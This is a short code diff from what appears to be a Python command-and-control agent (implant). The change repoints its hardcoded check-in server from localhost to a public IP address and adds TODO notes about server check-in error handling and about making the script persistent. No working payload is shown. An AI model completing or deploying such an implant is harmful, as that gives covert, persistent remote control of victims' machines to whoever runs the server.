@@ -9,12 +9,13 @@ import subprocess
 TODO: Create a builder script which creates this agent script 
 with specific configurations.
 
-TODO2: Create persistence on the script itself. 
+TODO2: Create error checking for checking in with the server 
+TODO3: Create persistence on the script itself. 
 """
 # Need to have hardcoded server ip address 
 
 # This is hardcoded, for now 
-URL = 'http://localhost:5000'
+URL = 'http://138.197.74.47:5000'
 FIRSTCONTACTKEY = 'firstcontactkey'
 
 
